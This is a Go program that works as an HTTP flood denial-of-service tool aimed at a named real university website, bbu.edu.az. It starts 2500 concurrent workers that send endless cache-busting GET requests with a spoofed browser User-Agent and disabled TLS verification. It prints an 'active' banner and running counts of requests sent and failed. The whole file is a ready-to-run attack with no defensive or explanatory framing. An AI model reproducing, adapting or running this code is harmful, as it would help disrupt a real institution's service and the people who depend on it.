package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"sync/atomic"
	"time"
)

var (
	target  = "https://bbu.edu.az" 
	sni     = "bbu.edu.az"
	workers = 2500
	count   uint64
	errors  uint64
)

func main() {
	fmt.Printf("[!!!] HAKAI-FORCE AKTİVDİR: %s\n", target)
	
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			NextProtos:         []string{"h2", "http/1.1"},
			ServerName:         sni,
		},
		MaxIdleConns:        10000,
		MaxIdleConnsPerHost: 5000,
		ForceAttemptHTTP2:   true,
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second,
	}

	for i := 0; i < workers; i++ {
		go func() {
			for {
				attack(client)
				time.Sleep(1 * time.Millisecond) 
			}
		}()
	}

	for {
		time.Sleep(5 * time.Second)
		fmt.Printf("[STATUS] SENT: %d | FAIL: %d\n", atomic.LoadUint64(&count), atomic.LoadUint64(&errors))
	}
}

func attack(c *http.Client) {
	u := fmt.Sprintf("%s/?r=%d", target, rand.Intn(999999))
	
	req, err := http.NewRequest("GET", u, nil)
	if err != nil {
		atomic.AddUint64(&errors, 1)
		return
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0")
	req.Header.Set("Cache-Control", "no-cache")
	
	resp, err := c.Do(req)
	if err != nil {
		atomic.AddUint64(&errors, 1)
		return
	}
	
	resp.Body.Close()
	atomic.AddUint64(&count, 1)
}
